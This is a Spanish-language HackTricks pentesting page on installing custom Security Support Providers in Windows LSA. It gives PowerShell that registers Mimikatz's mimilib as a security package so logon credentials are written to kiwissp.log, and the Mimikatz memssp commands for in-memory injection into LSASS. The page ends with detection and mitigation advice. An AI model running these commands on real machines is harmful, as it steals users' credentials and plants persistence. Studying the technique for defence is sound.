# Custom Security Support Providers

{{#include ../../banners/hacktricks-training.md}}

[Security Support Providers (SSPs)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi) son paquetes de seguridad basados en DLL que carga la Local Security Authority (LSA). Windows registra las DLL de SSP/AP personalizadas mediante el valor `REG_MULTI_SZ` `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` y carga los paquetes registrados cuando se inicia el sistema.<sup>[[1]](#references)</sup>

Dado que los SSP se ejecutan en la LSA y pueden recibir credenciales, los adversarios pueden abusar de un paquete malicioso para obtener acceso a credenciales y establecer persistencia. MITRE registra este comportamiento como T1547.005.<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Mimikatz incluye `mimilib.dll`, que implementa un SSP que registra las credenciales procesadas después de cargarse. En un laboratorio autorizado, coloca la DLL que coincida con la arquitectura del objetivo en `C:\Windows\System32` y, antes de modificarla, inspecciona la lista de paquetes actual.<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
Un valor existente típico puede contener paquetes como `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg` y `pku2u`. Conserva todas las entradas existentes al añadir el paquete personalizado.<sup>[[1]](#references)</sup>

Añade `mimilib` sin reemplazar los paquetes existentes:
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
Después de reiniciar, el paquete se carga en LSA y las credenciales capturadas posteriormente se escriben en `C:\Windows\System32\kiwissp.log` mediante esta implementación.<sup>[[2]](#references)[[3]](#references)</sup>

## Carga en memoria

Mimikatz también puede inyectar su implementación de SSP en el proceso LSASS actual:<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
Este método no persiste después de un reinicio.<sup>[[2]](#references)[[3]](#references)</sup>

## Detection and Mitigation

Supervisa los cambios en `...\Lsa\Security Packages` y las cargas inesperadas de DLL en `lsass.exe`. El evento de seguridad 4657 registra únicamente la modificación de un **valor** del registro cuando se configuran la directiva de auditoría del registro y la SACL correspondientes.<sup>[[2]](#references)[[4]](#references)</sup>

Cuando sea compatible, habilita la protección LSA adicional e investiga las DLL de SSP sin firma o inesperadas. Microsoft documenta específicamente la protección LSA como un control contra la inyección de código que podría comprometer las credenciales.<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - Registro de DLL SSP/AP](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Repositorio de Mimikatz - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Evento de seguridad 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - Configurar la protección LSA adicional](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
